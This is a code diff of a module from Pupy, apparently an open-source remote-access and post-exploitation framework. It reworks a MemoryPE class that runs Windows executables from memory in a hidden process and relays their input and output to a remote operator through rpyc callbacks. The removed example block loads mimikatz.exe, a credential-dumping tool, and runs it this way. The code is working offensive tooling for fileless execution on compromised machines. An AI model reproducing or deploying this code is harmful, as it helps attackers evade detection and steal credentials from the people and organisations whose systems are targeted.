@@ -1,143 +1,212 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # --------------------------------------------------------------
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # All rights reserved.
-# 
-# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
-# 
-# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-# 
-# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-# 
-# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-# 
-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+#
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions are met:
+#
+# 1. Redistributions of source code must retain the above copyright notice,
+# this list of conditions and the following disclaimer.
+#
+# 2. Redistributions in binary form must reproduce the above copyright notice,
+# this list of conditions and the following disclaimer in the documentation
+# and/or other materials provided with the distribution.
+#
+# 3. Neither the name of the copyright holder nor the names of its contributors
+# may be used to endorse or promote products derived from this software without
+# specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+# POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
+
 import sys
 import pupymemexec
 import time
 import os
 import ctypes
-from ctypes.wintypes import DWORD
 import traceback
 import time
 import threading
+import rpyc
 
-WAIT_TIMEOUT=0x00000102
+from ctypes.wintypes import DWORD, HANDLE, BOOL, LPVOID, UINT
+from ctypes import byref, create_string_buffer, POINTER, WinError
 
-def WriteFile(handle, data):
-    c_writen = DWORD()
-    buffer = ctypes.create_string_buffer(data)
-    if not ctypes.windll.kernel32.WriteFile(handle, buffer, len(data), ctypes.byref(c_writen), None):
-        raise ctypes.WinError()
+ERROR_BROKEN_PIPE = 0x6D
 
-def ReadFile(handle, max_bytes):
-    c_read = DWORD()
-    buffer = ctypes.create_string_buffer(max_bytes+1)
-    success = ctypes.windll.kernel32.ReadFile(handle, buffer, max_bytes, ctypes.byref(c_read), None)
-    if not success:
-        last_error=ctypes.windll.kernel32.GetLastError()
-        if last_error==0x6D:#ERROR_BROKEN_PIPE
-            return ""
-        raise WindowsError("ReadFile failed Errno: 0x%x"%last_error)
-    buffer[c_read.value] = '\x00'
-    return buffer.value
+PVOID = ctypes.c_voidp
+PDWORD = POINTER(DWORD)
+
+GetLastError = ctypes.windll.kernel32.GetLastError
+
+ReadFile = ctypes.windll.kernel32.ReadFile
+ReadFile.restype = BOOL
+ReadFile.argtypes = [
+    HANDLE, LPVOID, DWORD, PVOID, PVOID
+]
+
+WriteFile = ctypes.windll.kernel32.WriteFile
+WriteFile.restype = BOOL
+WriteFile.argtypes = [
+    HANDLE, LPVOID, DWORD, PVOID, PVOID
+]
+
+CloseHandle = ctypes.windll.kernel32.CloseHandle
+CloseHandle.restype = BOOL
+CloseHandle.argtypes = [ HANDLE ]
+
+TerminateProcess = ctypes.windll.kernel32.TerminateProcess
+TerminateProcess.restype = BOOL
+TerminateProcess.argtypes = [ HANDLE, UINT ]
+
+GetProcessId = ctypes.windll.kernel32.GetProcessId
+GetProcessId.restype = DWORD
+GetProcessId.argtypes = [ HANDLE ]
+
+PIPE_READMODE_BYTE = 0x0
+PIPE_NOWAIT = 0x1
 
 class MemoryPE(object):
-    """ run a pe from memory. The program output is displayed on program exit. You can set a timeout or raise KeyboardInterrupt to kill the program. If a timeout is set it will kill the program when it reaches the delay """
-    def __init__(self, raw_pe, args=[], suspended_process="cmd.exe", redirect_stdio=True, hidden=True, dupHandle=None):
-        self.cmdline=suspended_process
+    ''' run a pe from memory. '''
+    def __init__(self, raw_pe, args=[], suspended_process=None, hidden=True, dupHandle=None):
+        self.cmdline = suspended_process or 'cmd.exe'
+
         if args:
-            self.cmdline+=" "+" ".join(args)
-        self.raw_pe=raw_pe
-        self.suspended_process=suspended_process
-        self.redirect_stdio=redirect_stdio
-        self.hidden=hidden
-        self.hProcess=None
-        self.rpStdout=None
-        self.dupHandle=dupHandle
+            self.cmdline += ' '+' '.join(args)
+
+        self.raw_pe = raw_pe
+        self.suspended_process = suspended_process
+
+        self.hidden = hidden
+
+        self.hProcess = None
+        self.pStdin = None
+        self.pStdout = None
+        self.complete_cb = None
+        self.write_cb = None
+        self.terminate = False
+
+        self.dupHandle = dupHandle
         if self.dupHandle is None:
-            self.dupHandle=0
-        self.EOF=threading.Event()
+            self.dupHandle = 0
+
+        self.EOF = threading.Event()
 
     def close(self):
-        #Killing the program if he is still alive
-        ctypes.windll.kernel32.CloseHandle(self.rpStdout)
-        ctypes.windll.kernel32.TerminateProcess(self.hProcess, 1);
-        ctypes.windll.kernel32.CloseHandle(self.hProcess)
+        # Killing the program if he is still alive
+        self.EOF.set()
 
-    def wait(self, timeout=None):
-        """ return False if the timeout occured"""
-        if self.hProcess is None:
-            return True
-        starttime=time.time()
-        while True:
-            try:
-                res=ctypes.windll.kernel32.WaitForSingleObject(self.hProcess, DWORD(1))# not INFINITE to be able to interrupt it !
-                if res!=WAIT_TIMEOUT:
-                    break
-                if timeout is not None and time.time()-starttime>timeout:
-                    return False
-            except KeyboardInterrupt:
-                break
-        return True
+        if self.pStdin:
+            CloseHandle(self.pStdin)
+            self.pStdin = None
 
-    def get_stdout(self):
-        if not self.hProcess:
-            return ""
-        #Closing the write handle to avoid lock:
-        #ctypes.windll.kernel32.CloseHandle(self.rpStdout)
+        if self.hProcess:
+            if self.terminate:
+                TerminateProcess(self.hProcess, 1);
 
-        fulldata=b""
-        while True:
-            data=ReadFile(self.pStdout, 2048)
-            if not data:
-                self.EOF.set()
-                break
-            fulldata+=data
-        return fulldata
+            CloseHandle(self.hProcess)
+            self.hProcess = None
 
-    def write_stdin(self, data):
-        WriteFile(self.pStdin, data)
+        if self.complete_cb:
+            self.complete_cb()
+            self.complete_cb = None
 
-    def get_shell(self):
-        t=threading.Thread(target=self.loop_read)
-        t.daemon=True
-        t.start()
+        if self.write_cb:
+            self.write_cb = None
+
+    def execute(self, complete_cb, write_cb):
+        ''' Execute process '''
+
+        if complete_cb:
+            self.complete_cb = rpyc.async(complete_cb)
+
+        if write_cb:
+            self.write_cb = rpyc.async(write_cb)
+            self.terminate = True
+
         try:
+            hProcess, pStdin, pStdout = pupymemexec.run_pe_from_memory(
+                self.cmdline, self.raw_pe, write_cb is not None,
+                self.hidden, self.dupHandle
+            )
+        except Exception, e:
+            return False
+
+        self.pStdout = HANDLE(pStdout)
+        self.pStdin = HANDLE(pStdin)
+
+        self.hProcess = HANDLE(hProcess)
+
+        if self.hProcess is None:
+            return
+
+        if write_cb:
+            loop = threading.Thread(target=self._loop)
+            loop.daemon = True
+            loop.start()
+        else:
+            if self.complete_cb:
+                self.complete_cb()
+
+        return GetProcessId(self.hProcess)
+
+    def _loop(self):
+        try:
+            starttime = time.time()
+            VECTOR = (HANDLE * 2)
+
             while True:
-                data=raw_input()
-                self.write_stdin(data+"\n")
-                if data=="exit":
-                    break
-                if self.EOF.is_set():
-                    break
+                buffer = create_string_buffer(2048)
+                c_read = DWORD(0)
+                success = ReadFile(
+                    self.pStdout, buffer, len(buffer)-1, byref(c_read), None
+                )
+
+                if not success:
+                    last_error = GetLastError()
+                    if last_error == ERROR_BROKEN_PIPE:
+                        break
+
+                if c_read.value > 0:
+                    buffer[c_read.value] = '\x00'
+
+                    if self.write_cb:
+                        try:
+                            self.write_cb(buffer.value)
+                        except:
+                            # We need to empty pipe anyway
+                            pass
+
+            CloseHandle(self.pStdout)
+            self.pStdout = None
+
+        except Exception, e:
+            if self.write_cb:
+                try:
+                    self.write_cb('[+] Exception: {}'.format(e))
+                except:
+                    pass
+
         finally:
             self.close()
 
-    def loop_read(self):
-        while True:
-            data=ReadFile(self.pStdout, 2048)
-            sys.stdout.write(data)
-            sys.stdout.flush()
-            if not data:
-                break
+    def write(self, data):
+        try:
+            c_written = DWORD()
+            buffer = create_string_buffer(data)
+            if not WriteFile(self.pStdin, buffer, len(buffer), byref(c_written), None):
+                raise WinError()
 
-    def run(self):
-        hProcess, pStdin, pStdout, rpStdin, rpStdout =  pupymemexec.run_pe_from_memory(self.cmdline, self.raw_pe, self.redirect_stdio, self.hidden, self.dupHandle)
-        self.pStdout=pStdout
-        self.pStdin=pStdin
-        self.rpStdout=rpStdout
-        self.rpStdin=rpStdin
-        self.hProcess=hProcess
-
-
-
-if __name__=="__main__":
-    with open("mimikatz.exe",'rb') as f:
-        mpe=MemoryPE(f.read())
-        mpe.run()
-        mpe.get_shell()
-        #mpe.wait(5)
-        #mpe.close()
-        #print mpe.get_stdout()
+        except:
+            self.close()
